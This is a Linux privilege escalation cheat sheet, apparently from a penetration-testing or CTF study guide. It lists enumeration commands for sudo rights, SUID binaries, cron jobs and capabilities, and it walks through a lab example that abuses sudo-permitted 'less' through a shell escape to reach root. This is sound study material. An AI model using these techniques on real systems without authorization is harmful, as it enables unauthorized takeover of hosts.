# Privilege Escalation Cheat Sheet (Linux)

## Overview

Linux privilege escalation techniques exploit misconfigurations, weak permissions, or vulnerable software to move from a low-privileged user to root (or another higher-privileged account).

## Common Syntax

Varies by vector — see below.

## Useful Commands

```bash
# Check sudo privileges
sudo -l

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check kernel version for known exploits
uname -a

# Check for writable /etc/passwd or /etc/shadow
ls -la /etc/passwd /etc/shadow

# Check cron jobs for scripts run by root
cat /etc/crontab
ls -la /etc/cron.*

# Check for exposed capabilities
getcap -r / 2>/dev/null
```

## Important Options / Vectors

| Vector | Description |
|---|---|
| Sudo misconfiguration | A user is permitted to run a binary via `sudo` that can be abused to spawn a shell (verify against GTFOBins) |
| SUID/SGID binaries | Binaries that execute with the file owner's/group's privileges rather than the invoking user's |
| Cron jobs | Scheduled tasks run as root that reference writable scripts or files |
| Kernel exploits | Known vulnerabilities in outdated kernel versions |
| Writable `/etc/passwd` | Can allow adding a new root-equivalent user entry |
| Capabilities | Fine-grained Linux privileges (e.g., `cap_setuid`) assigned to binaries, some of which are exploitable |

## Examples

```text
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

```text
$ sudo less /etc/hosts
!/bin/sh
# whoami
root
```

A `sudo`-permitted `less` binary was abused via its documented GTFOBins shell escape to obtain a root shell (see [07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md)).

## Common Mistakes

- Not checking `sudo -l` output against GTFOBins for every listed binary.
- Overlooking SUID binaries that aren't part of the "common" list (always check the full `find` output).
- Assuming an outdated kernel automatically means a public exploit is safe to run without understanding its impact (e.g., causing a crash on a production-like system).

## References

- [GTFOBins](https://gtfobins.org/)
- [HackTricks – Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

## Key Takeaways

- Always check `sudo -l` and SUID binaries first — they are the fastest, most common escalation paths.
- GTFOBins is the definitive reference for determining whether a permitted binary can be abused.
